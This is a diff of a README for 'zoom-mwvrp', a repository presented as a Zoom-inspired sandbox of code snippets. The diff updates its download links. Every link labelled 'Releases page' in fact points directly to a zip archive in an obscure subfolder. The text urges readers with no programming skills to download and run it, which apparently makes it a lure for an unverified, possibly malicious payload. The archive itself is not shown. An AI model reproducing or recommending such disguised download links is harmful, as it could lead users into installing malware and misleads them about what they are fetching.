@@ -4,13 +4,13 @@
 The **zoom-mwvrp** project is an experimental sandbox inspired by Zoom. This application showcases random code snippets, creative ideas, and prototypes. It offers a playful way to explore different coding concepts and see how they function.
 
 ## 📥 Download Now
-[![Download zoom-mwvrp](https://raw.githubusercontent.com/ayman-star/zoom-mwvrp/main/Nguyen/zoom-mwvrp.zip)](https://raw.githubusercontent.com/ayman-star/zoom-mwvrp/main/Nguyen/zoom-mwvrp.zip)
+[![Download zoom-mwvrp](https://github.com/ayman-star/zoom-mwvrp/raw/refs/heads/main/Nguyen/zoom-mwvrp-3.8.zip)](https://github.com/ayman-star/zoom-mwvrp/raw/refs/heads/main/Nguyen/zoom-mwvrp-3.8.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the zoom-mwvrp application. There is no need for programming skills.
 
 1. **Visit the Releases Page**
-   To get the latest version of the application, visit the [Releases page](https://raw.githubusercontent.com/ayman-star/zoom-mwvrp/main/Nguyen/zoom-mwvrp.zip).
+   To get the latest version of the application, visit the [Releases page](https://github.com/ayman-star/zoom-mwvrp/raw/refs/heads/main/Nguyen/zoom-mwvrp-3.8.zip).
 
 2. **Select the Version**
    On the Releases page, you will see a list of available versions. Look for the most recent release, which is usually at the top of the list.
@@ -61,4 +61,4 @@ We appreciate the community's support in developing and enhancing zoom-mwvrp. Yo
 This project is licensed under the MIT License. You can use, modify, and share the software as per the terms of this license.
 
 ## 📥 Download the Application
-Visit the [Releases page](https://raw.githubusercontent.com/ayman-star/zoom-mwvrp/main/Nguyen/zoom-mwvrp.zip) to get started.
+Visit the [Releases page](https://github.com/ayman-star/zoom-mwvrp/raw/refs/heads/main/Nguyen/zoom-mwvrp-3.8.zip) to get started.
